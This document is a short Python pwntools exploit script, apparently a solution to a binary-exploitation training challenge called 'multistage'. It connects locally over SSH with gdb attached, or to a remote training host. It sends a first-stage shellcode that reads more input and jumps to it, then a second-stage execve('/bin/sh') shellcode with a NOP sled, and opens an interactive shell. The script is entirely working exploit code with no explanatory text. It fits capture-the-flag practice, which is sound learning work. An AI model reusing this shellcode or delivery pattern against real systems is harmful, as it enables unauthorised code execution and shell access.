from pwn import *



run_local = True
if run_local:
	s = ssh(host='localhost',user='acidburn',port=2222)
	r= s.process('/home/acidburn/Desktop/malicious/shell/4/multistage')
	pid=gdb.attach(r)
	input("wait")
else:
	r=remote("bin.training.jinblack.it",2003)

shellcode = b"\x68\x70\x40\x40\x00\x5E\x6A\x00\x58\x48\x89\xC7\x6A\x20\x5A\x0F\x05\xFF\xE6"
r.send(shellcode)

shellcode = b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xEB\x18\x48\xC7\xC0\x3B\x00\x00\x00\x5F\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x0F\x05\xE8\xE3\xFF\xFF\xFF/bin/sh\x00" ##shellcode starting from next instruction with reasonable nop sled

r.send(shellcode)
r.interactive()
